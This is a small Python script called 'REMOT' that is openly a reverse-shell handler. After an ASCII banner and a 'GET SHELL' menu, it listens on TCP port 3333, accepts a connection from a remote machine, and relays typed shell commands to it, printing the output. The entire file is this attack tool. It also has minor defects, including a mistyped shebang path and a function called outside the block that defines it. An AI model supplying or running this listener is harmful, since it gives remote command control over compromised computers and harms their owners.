#!/use/bin/python3
import sys
from socket import *

VERSION = '0.1'

R = '\033[31m'  # red
B = '\033[34m'  # blue
P = '\033[35m'  # pink
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow

def banner():
       art = r'''

'########::'########:'##::::'##::'#######::'########:
 ##.... ##: ##.....:: ###::'###:'##.... ##:... ##..::
 ##:::: ##: ##::::::: ####'####: ##:::: ##:::: ##::::
 ########:: ######::: ## ### ##: ##:::: ##:::: ##::::
 ##.. ##::: ##...:::: ##. #: ##: ##:::: ##:::: ##::::
 ##::. ##:: ##::::::: ##:.:: ##: ##:::: ##:::: ##::::
 ##:::. ##: ########: ##:::: ##:. #######::::: ##::::
..:::::..::........::..:::::..:::.......::::::..:::::'''
       print(f'{B}{art}{W}\n')
       print(f'{R}<=== {Y}SOME INFORMATION {R}===>')
       print(f'{R}[>] {C}Created By   : {P}NITIN KUMAR')
       print(f'{R}[>] {C}Version      : {P}{VERSION}')
       print(f'{R}-------------------------------')
       print(f'{Y}1. GET SHELL ')
       print(f'{Y}2. EXIT{W}\n')

banner()

usr = int(input("CHOOSE OPTION: "))
if usr == 2:
     print("Thank for use")
     sys.exit()
if usr == 1:
   def connect():
       server = socket(AF_INET,SOCK_STREAM)
       server.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
       HOST = input("ENTER HOST: ")
       
       server.bind((HOST,3333))
       print("Lintening...")
       server.listen(1)
       client,addr = server.accept()
       print("CONNECTED")

       while True:
           cmd = input("$ ")
           client.send(cmd.encode())
           if cmd == "exit":
               break
           output = (client.recv(1024)).decode()
           print(output)

connect()
